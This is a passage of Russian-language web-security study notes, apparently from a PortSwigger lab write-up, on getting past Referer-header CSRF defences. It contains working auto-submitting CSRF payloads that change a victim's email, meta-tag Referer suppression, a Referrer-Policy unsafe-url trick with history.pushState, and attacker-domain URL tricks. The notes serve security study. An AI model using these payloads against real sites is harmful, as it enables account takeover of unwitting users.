...
>Заголовок HTTP Referer (который по ошибке [неправильно](https://ru.wikipedia.org/wiki/HTTP_referer) указан в спецификации HTTP) - это необязательный заголовок запроса, содержащий URL веб-страницы, которая ссылается на запрашиваемый ресурс. Обычно он автоматически добавляется браузерами, когда пользователь вызывает HTTP-запрос, в том числе при нажатии на ссылку или отправке формы. Существуют различные методы, позволяющие ссылающейся странице скрывать или изменять значение заголовка Referer. Часто это делается из соображений конфиденциальности.

### Проверка Referer зависит от наличия заголовка

Некоторые приложения проверяют заголовок `Referer`, когда он присутствует в запросах, но пропускают проверку, если заголовок пропущен.

В такой ситуации можно создать свой CSRF-эксплойт таким образом, чтобы заставить браузер пользователя-жертвы пропустить заголовок Referer в результирующем запросе. Существуют различные способы добиться этого, но самым простым является использование тега META в HTML-странице, на которой проводится CSRF-атака:

```html
<meta name="referrer" content="never">
<form method="POST" action="https://0a9b000403ec3128c1b136a100b60016.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwn3d@1337.net">
</form>
<script>
    document.forms[0].submit();
</script>
...
Некоторые приложения проверяют заголовок `Referer` наивным способом, который можно обойти. Например, если приложение проверяет, что домен в `Referer` начинается с ожидаемого значения, то злоумышленник может поместить его в качестве поддомена своего собственного домена:

```
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

Аналогично, если приложение просто проверяет, что Referer содержит его собственное доменное имя, то можно разместить требуемое значение в другом месте URL:

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

>Хотя вы можете определить такое поведение с помощью Burp, вы часто обнаружите, что этот подход больше не работает, когда вы начнете тестировать свою концепцию в браузере. В попытке снизить риск утечки конфиденциальных данных таким образом, многие браузеры теперь по умолчанию удаляют строку запроса из заголовка `Referer`
>Вы можете отменить это поведение, убедившись, что в ответе, содержащем ваш эксплойт, установлен заголовок `Referrer-Policy: unsafe-url` (обратите внимание, что `Referrer` в данном случае пишется правильно, просто чтобы убедиться, что вы внимательны!) Это гарантирует, что будет отправлен полный URL, включая строку запроса

```html
<meta name="referrer" content="unsafe-url">
<script>
    history.pushState("", "", "/?0af700a90415143ec147c1e300350093.web-security-academy.net");
</script>
<form method="POST" action="https://0af700a90415143ec147c1e300350093.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
